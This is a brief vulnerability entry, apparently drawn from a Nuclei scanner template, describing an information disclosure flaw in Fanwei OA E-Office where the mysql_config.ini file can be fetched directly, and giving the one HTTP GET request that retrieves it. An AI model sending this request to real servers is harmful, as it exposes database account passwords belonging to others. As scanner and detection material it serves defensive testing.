# Vulnerability: Fanwei OA E-Office - Information Disclosure
**Classification:** FANWEI
**Source:** Nuclei Template (`ecology-mysql-config.yaml`)

## Description
Fanwei E-Office mysql_config.ini file can be directly accessed, leaking database account password and other information.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/mysql_config.ini
```

